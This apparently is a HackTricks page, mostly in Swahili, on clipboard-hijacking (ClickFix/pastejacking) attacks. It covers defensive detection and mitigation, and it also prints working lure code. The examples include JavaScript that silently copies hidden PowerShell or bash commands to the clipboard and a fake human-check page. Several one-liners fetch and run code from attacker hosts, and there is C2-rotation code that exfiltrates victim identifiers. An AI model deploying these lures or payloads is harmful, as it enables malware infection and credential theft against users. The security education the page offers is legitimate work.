# Clipboard Hijacking (Pastejacking) Mashambulio

{{#include ../../banners/hacktricks-training.md}}

> "Usibandika chochote usichokikopa mwenyewe." – wa zamani lakini bado ni ushauri sahihi

## Muhtasari

Clipboard hijacking – pia inajulikana kama *pastejacking* – inatumia ukweli kwamba watumiaji mara kwa mara hukopa-na-kubandika amri bila kuzichunguza. Ukurasa wa wavuti wenye madhara (au mazingira yoyote yanayoweza kuendesha JavaScript kama Electron au Desktop application) unaweka kwa programu maandishi yanayodhibitiwa na mshambulizi kwenye clipboard ya mfumo. Waathirika huhamasishwa, kawaida kwa maagizo ya social-engineering yaliyoandaliwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* yaliyomo kwenye clipboard, na kutekeleza mara moja amri za aina yoyote.

Kwa kuwa **hakuna faili inayopakuliwa na hakuna attachment inayofunguliwa**, mbinu hii inapita udhibiti wa usalama wa barua pepe na wa maudhui ya wavuti unaoangaliza attachments, macros au utekelezaji wa amri moja kwa moja. Kwa hivyo shambulio hili ni maarufu katika kampeni za phishing zinazowasilisha familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## JavaScript Uthibitisho wa Dhana
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, kampeni mpya zinategemea isiyo ya wakati mmoja **Clipboard API** (`navigator.clipboard.writeText`).

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji anatembelea tovuti iliyofanyiwa typosquatting au iliyodukuliwa (mfano `docusign.sa[.]com`)
2. JavaScript iliyowekwa ya **ClearFake** inaita helper `unsecuredCopyToClipboard()` ambayo kwa kimya-nyama inaweka Base64-encoded PowerShell one-liner kwenye clipboard.
3. Maelekezo ya HTML huelekeza mwathiriwa: *“Bonyeza **Win + R**, paste amri na bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` inaendesha, ikipakua archive inayojumuisha executable halali pamoja na DLL hasidi (classic DLL sideloading).
5. Loader inafumbua hatua za ziada (decrypts), inaingiza shellcode na kusanidi persistence (mfano scheduled task) – hatimaye ikiwasha NetSupport RAT / Latrodectus / Lumma Stealer.

### Mfano wa NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) inatafuta `msvcp140.dll` kwenye saraka yake.
* `DLL` ya hasidi inatambua APIs wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kwa kutumia **curl.exe**, inazifungua (decrypts) kwa kutumia rolling XOR key `"https://google.com/"`, inaingiza shellcode ya mwisho, kisha inatoa **client32.exe** (NetSupport RAT) kutoka kwenye ZIP hadi `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa **curl.exe**
2. Inaendesha JScript downloader ndani ya **cscript.exe**
3. Inachukua MSI payload → inaweka `libcef.dll` kando ya programu iliyo sainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wito la **mshta** linaanzisha script ya PowerShell iliyofichwa inayopakua `PartyContinued.exe`, inatoa `Boat.pst` (CAB), inajenga upya `AutoIt3.exe` kupitia `extrac32` na concatenation ya faili na hatimaye inaendesha script ya `.a3x` ambayo hupeleka data za kuingia za kivinjari kwa `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK na rotating C2 (PureHVNC)

Baadhi ya kampeni za ClickFix hazipakui faili kabisa na huagiza waathiriwa kubandika one‑liner inayopakua na kuendesha JavaScript kupitia WSH, kuiweka kwa kudumu, na rotates C2 daily. Mfano wa mnyororo uliotazamwa:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa inageuzwa wakati wa runtime ili kuepuka ukaguzi wa kawaida.
- JavaScript inadumu kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – kuwezesha mzunguko wa haraka wa domain.

Kifungu kidogo cha JS kinachotumika kuzungusha C2s kwa tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Mti wa mchakato: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` ikiiita WScript/CScript na njia ya JS chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na telemetry ya mstari‑wa‑amri yenye `.split('').reverse().join('')` au `eval(a.responseText)`.
- Kurudia `powershell -NoProfile -NonInteractive -Command -` yenye payloads kubwa za stdin ili kumnyonyesha scripts ndefu bila mistari mirefu ya amri.
- Scheduled Tasks ambazo baadaye zinaendesha LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/nyaya inayofanana na updater (mfano, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames na URLs zenye muundo `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Linganisha clipboard write events ikifuatiwa na Win+R paste kisha mara moja `powershell.exe` execution.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – tazama viingizo vya Base64 / vilivyofichwa visivyo vya kawaida.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla ya tukio la 4688 linaloshukiwa.
* EDR clipboard sensors (ikiwa zipo) – linganisha `Clipboard Write` ikifuatiwa mara moja na process mpya ya PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Kampeni za hivi karibuni zinazalisha kwa wingi kurasa za udhibitisho za CDN/browser za uongo ("Just a moment…", IUAM-style) ambazo zinawatishia watumiaji ili kunakili amri maalumu za OS kutoka clipboard yao na kuziweka kwenye consoles za asili. Hii inabadilisha utekelezaji kutoka kwenye sandbox ya browser na inafanya kazi kwa Windows na macOS.

Key traits of the builder-generated pages
- Ugundaji wa OS kupitia `navigator.userAgent` ili kubinafsisha payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops za hiari kwa OS zisizoendana ili kudumisha udanganyifu.
- Nakili‑kiotomatiki kwenye clipboard kwa vitendo vinavyotarajiwa vya UI (checkbox/Copy) wakati maandishi yanayoonekana yanaweza kutofautiana na yaliyomo kwenye clipboard.
- Kuzuiwa kwa mobile na popover yenye maelekezo hatua‑kwa‑hatua: Windows → Win+R→paste→Enter; macOS → fungua Terminal→paste→Enter.
- Obfuscation ya hiari na injector ya faili moja kubadilisha DOM ya site iliyodhulumiwa na UI ya uhakikisho yenye mtindo wa Tailwind (hakuna usajili wa domain mpya unahitajika).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Uendelevu wa utekelezaji wa awali kwenye macOS
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, kupunguza athari zinazoweza kuonekana.

In-place page takeover kwenye tovuti zilizodukuliwa
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Mawazo ya utambuzi na uwindaji maalum kwa lures za aina ya IUAM

- Web: Kurasa zinazofunga Clipboard API kwenye widget za uthibitisho; kutokubaliana kati ya maandishi yanayoonyeshwa na payload ya clipboard; `navigator.userAgent` branching; Tailwind + single-page replace katika muktadha wenye shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano wa browser; batch/MSI installers zikitekelezwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm inazalisha `bash`/`curl`/`base64 -d` na `nohup` karibu na matukio ya browser; background jobs zinazodumu baada ya kufungwa kwa terminal.
- Linganisha historia ya Win+R (`RunMRU`) na uandishi wa clipboard pamoja na uundaji wa mchakato wa console uliofuata.

Angalia pia mbinu zinazounga mkono

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Kupunguzaji

1. Kukaza browser – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au kuhitaji user gesture.
2. Uelewa wa usalama – fundisha watumiaji *kuandika* amri nyeti au kuzibandika kwanza kwenye mhariri wa maandishi.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzizuia arbitrary one-liners.
4. Dhibiti mtandao – zuia maombi ya outbound kwa domain zilizojulikana za pastejacking na malware C2.

## Mbinu Zinazohusiana

* **Discord Invite Hijacking** mara nyingi hutumia njia ile ile ya ClickFix baada ya kuwavutia watumiaji kwenye server hatarishi:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
